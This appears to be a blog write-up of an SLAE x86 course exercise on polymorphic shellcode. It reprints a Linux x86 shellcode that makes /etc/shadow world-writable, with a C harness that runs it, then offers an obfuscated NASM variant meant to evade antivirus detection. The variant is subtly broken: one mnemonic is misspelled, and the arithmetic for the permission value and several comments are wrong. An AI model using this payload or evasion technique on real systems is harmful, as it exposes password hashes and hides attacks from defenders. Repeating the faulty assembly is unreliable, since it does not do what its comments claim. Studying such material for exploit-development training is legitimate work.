---
title:  "SLAE x86 Assignment 6: Polymorphic Shellcode"
header:
  teaser: "/assets/images/slae32.png"
  teaser_home_page: true
categories:
  - exploit dev
classes: wide
tags:
  - exploit dev
  - slae
---

Hey guys! Welcome back! In this post, we will look at assignment 6 of the SLAE x86 certification. Let's dive right in!

## Understanding The Objective ##
So what is Polymorphism? It is a technique used by exploit developers in order to prevent detection by anti-viruses, and make it hard for other security researchers to fingerprint and understand malicious shellcode. It is done by replacing instructions with similar ones, or by adding in arbitrary instructions that do not affect the operation of the shellcode, or both.

As you may imagine though, this will lead to an increase in size of the shellcode. With that being said, let's start with our first shellcode!

### Shellcode 1: [chmod(/etc/shadow, 0666) & exit()](http://shell-storm.org/shellcode/files/shellcode-556.php)
This shellcode will change the permissions of ```/etc/shadow``` to 666 by executing a ```chmod```. Written by ka0x, here is the original shellcode. It currently has a size of 33 bytes:
```c
#include <stdio.h>

/*
    linux/x86 ; chmod(/etc/shadow, 0666) & exit() 33 bytes
    written by ka0x - <ka0x01[alt+64]gmail.com>
    lun sep 21 17:13:25 CEST 2009

    greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!

*/

int main()
{

    char shellcode[] =
            "\x31\xc0"          // xor eax,eax
            "\x50"              // push eax
            "\x68\x61\x64\x6f\x77"      // push dword 0x776f6461
            "\x68\x2f\x2f\x73\x68"      // push dword 0x68732f2f
            "\x68\x2f\x65\x74\x63"      // push dword 0x6374652f
            "\x89\xe3"          // mov ebx,esp
            "\x66\x68\xb6\x01"      // push word 0x1b6
            "\x59"              // pop ecx
            "\xb0\x0f"          // mov al,0xf
            "\xcd\x80"          // int 0x80
            "\xb0\x01"          // mov al,0x1
            "\xcd\x80";         // int 0x80

    printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );
    (*(void(*)()) shellcode)();

    return 0;
}
```
Here is a polymorphic version:
```nasm
global _start

section .text
_start:

  ;clear registers
  lahf                                        ;load flags
  cmc                                         ;complement the carry flag (random stuff)
  xor ecx, ecx                                ;ecx=0
  mul ecx                                     ;eax and ebx=0

  ;chmod
  add al,0xf                                  ;syscall number for chmod
  push ecx                                    ;push nulls onto the stack
  mov dword [esp-4], 0x776f6461               
  mov dword [esp-8], 0x68732f2f               
  mov dword [esp-12], 0x6374652f              ;/etc/shadow
  sub esp, 12                                 ;stack adjustment
  mov esi, esp                                ;move pointer to args into esi
  xchng ebx, esi                              ;move pointer to args into ebx
  push word 0x22b                             ;push 555
  pop ecx                                     ;pop it into ecx
  add ecx, 0x49                               ;add 111 to ecx, which makes it 666
  int 0x80                                    ;syscall
  xor eax, eax                                

  ;exit
  mov al, 0x1
  int 0x80
```
